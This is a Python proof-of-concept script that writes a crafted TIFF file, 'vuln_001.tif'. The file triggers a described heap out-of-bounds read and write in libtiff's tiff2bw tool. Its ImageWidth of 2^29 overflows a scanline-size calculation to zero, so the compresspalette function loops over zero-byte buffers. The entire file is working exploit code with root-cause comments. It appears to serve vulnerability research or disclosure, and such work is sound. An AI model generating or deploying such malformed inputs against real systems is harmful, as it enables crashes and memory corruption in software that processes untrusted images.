#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Heap OOB Read+Write via Zero-Size inbuf/outbuf Allocation in compresspalette
Source: libtiff/tools/tiff2bw.c, lines 207, 230-236

Root Cause:
  ImageWidth=536870912 (2^29) with BitsPerSample=8, SamplesPerPixel=1:
  TIFFScanlineSize computes w * bps = 2^29 * 8 = 2^32 which overflows uint32 to 0.
  libtiff detects the overflow and returns 0.
  _TIFFmalloc(0) returns a valid non-NULL 0-byte allocation on Linux.
  TIFFReadScanline writes 0 bytes (StripByteCounts=0).
  compresspalette() then loops w times over the 0-byte inbuf/outbuf => heap OOB.
"""

import struct
import os

# Output path relative to this script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_PATH = os.path.join(SCRIPT_DIR, "vuln_001.tif")

# ---- TIFF constants --------------------------------------------------------
TIFF_LITTLE_ENDIAN = b'II'
TIFF_MAGIC = 42

# Tag numbers
TAG_IMAGE_WIDTH          = 256
TAG_IMAGE_LENGTH         = 257
TAG_BITS_PER_SAMPLE      = 258
TAG_COMPRESSION          = 259
TAG_PHOTOMETRIC          = 262
TAG_STRIP_OFFSETS        = 273
TAG_SAMPLES_PER_PIXEL    = 277
TAG_ROWS_PER_STRIP       = 278
TAG_STRIP_BYTE_COUNTS    = 279
TAG_XRESOLUTION          = 282
TAG_YRESOLUTION          = 283
TAG_RESOLUTION_UNIT      = 296
TAG_COLORMAP             = 320

# TIFF field types
TYPE_SHORT    = 3   # uint16
TYPE_LONG     = 4   # uint32
TYPE_RATIONAL = 5   # two uint32 values

# Field values
IMAGE_WIDTH   = 536870912   # 2^29 exactly: w*8 overflows uint32 to 0
IMAGE_LENGTH  = 1
BITS_PER_SAMPLE  = 8
COMPRESSION   = 1           # No compression
PHOTOMETRIC   = 3           # PHOTOMETRIC_PALETTE
SAMPLES_PER_PIXEL = 1
ROWS_PER_STRIP    = 1
RESOLUTION_UNIT   = 2       # Inch
XRES_NUM = 72
XRES_DEN = 1
YRES_NUM = 72
YRES_DEN = 1

# Number of colormap entries: 3 * 2^BitsPerSample = 3 * 256 = 768 shorts
COLORMAP_COUNT = 3 * (1 << BITS_PER_SAMPLE)  # 768

# ---- Layout ----------------------------------------------------------------
# Offset 0:   TIFF header (8 bytes)
# Offset 8:   IFD  (2 + 13*12 + 4 = 162 bytes, ends at 170)
# Offset 170: XResolution RATIONAL (8 bytes, ends at 178)
# Offset 178: YResolution RATIONAL (8 bytes, ends at 186)
# Offset 186: Colormap shorts (768 * 2 = 1536 bytes, ends at 1722)
# Offset 1722: Strip data (empty; StripByteCounts=0)

IFD_OFFSET       = 8
NUM_ENTRIES      = 13
IFD_BODY_SIZE    = 2 + NUM_ENTRIES * 12 + 4   # 162
IFD_END          = IFD_OFFSET + IFD_BODY_SIZE  # 170

XRES_OFFSET      = IFD_END           # 170
YRES_OFFSET      = XRES_OFFSET + 8  # 178
COLORMAP_OFFSET  = YRES_OFFSET + 8  # 186
STRIP_OFFSET     = COLORMAP_OFFSET + COLORMAP_COUNT * 2  # 1722


def pack_entry(tag, typ, count, value_or_offset):
    """Pack a 12-byte IFD directory entry (little-endian)."""
    return struct.pack('<HHII', tag, typ, count, value_or_offset)


def pack_short_entry(tag, value):
    """Pack a SHORT IFD entry (value fits in 4-byte field, little-endian)."""
    # For SHORT: value occupies bytes 0-1 of the 4-byte field (LE)
    return struct.pack('<HHIHH', tag, TYPE_SHORT, 1, value, 0)


def build_tiff():
    parts = []

    # --- Header (8 bytes) ---
    header = TIFF_LITTLE_ENDIAN
    header += struct.pack('<H', TIFF_MAGIC)
    header += struct.pack('<I', IFD_OFFSET)
    parts.append(header)

    # --- IFD entries (must be sorted by tag number) ---
    entries = b''
    entries += pack_entry(TAG_IMAGE_WIDTH,      TYPE_LONG,  1, IMAGE_WIDTH)
    entries += pack_entry(TAG_IMAGE_LENGTH,     TYPE_LONG,  1, IMAGE_LENGTH)
    entries += pack_short_entry(TAG_BITS_PER_SAMPLE, BITS_PER_SAMPLE)
    entries += pack_short_entry(TAG_COMPRESSION,     COMPRESSION)
    entries += pack_short_entry(TAG_PHOTOMETRIC,     PHOTOMETRIC)
    entries += pack_entry(TAG_STRIP_OFFSETS,    TYPE_LONG,  1, STRIP_OFFSET)
    entries += pack_short_entry(TAG_SAMPLES_PER_PIXEL, SAMPLES_PER_PIXEL)
    entries += pack_entry(TAG_ROWS_PER_STRIP,   TYPE_LONG,  1, ROWS_PER_STRIP)
    entries += pack_entry(TAG_STRIP_BYTE_COUNTS, TYPE_LONG, 1, 0)
    entries += pack_entry(TAG_XRESOLUTION,      TYPE_RATIONAL, 1, XRES_OFFSET)
    entries += pack_entry(TAG_YRESOLUTION,      TYPE_RATIONAL, 1, YRES_OFFSET)
    entries += pack_short_entry(TAG_RESOLUTION_UNIT, RESOLUTION_UNIT)
    entries += pack_entry(TAG_COLORMAP,         TYPE_SHORT, COLORMAP_COUNT, COLORMAP_OFFSET)

    assert len(entries) == NUM_ENTRIES * 12, f"Expected {NUM_ENTRIES*12}, got {len(entries)}"

    # IFD: count + entries + next_ifd
    ifd = struct.pack('<H', NUM_ENTRIES)
    ifd += entries
    ifd += struct.pack('<I', 0)  # no next IFD
    parts.append(ifd)

    # --- XResolution RATIONAL ---
    parts.append(struct.pack('<II', XRES_NUM, XRES_DEN))

    # --- YResolution RATIONAL ---
    parts.append(struct.pack('<II', YRES_NUM, YRES_DEN))

    # --- Colormap (768 SHORTs = 1536 bytes) ---
    # Minimal colormap: all zeros (black) - libtiff just needs it present
    colormap = b'\x00' * (COLORMAP_COUNT * 2)
    parts.append(colormap)

    # --- Strip data (0 bytes; StripByteCounts=0 so nothing is read) ---
    # No data needed; STRIP_OFFSET points here but nothing is read

    return b''.join(parts)


def main():
    data = build_tiff()
    with open(OUT_PATH, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUT_PATH}")
    print(f"[+] ImageWidth = {IMAGE_WIDTH} (0x{IMAGE_WIDTH:08X} = 2^29)")
    print(f"[+] w * BitsPerSample = {IMAGE_WIDTH} * 8 = {IMAGE_WIDTH * 8} (0x{IMAGE_WIDTH * 8:016X})")
    print(f"[+] uint32 overflow result: {(IMAGE_WIDTH * 8) & 0xFFFFFFFF} => TIFFScanlineSize returns 0")
    print(f"[+] _TIFFmalloc(0) -> valid 0-byte allocation (Linux)")
    print(f"[+] compresspalette loops {IMAGE_WIDTH} times over 0-byte buffers => OOB on iteration 1")


if __name__ == '__main__':
    main()
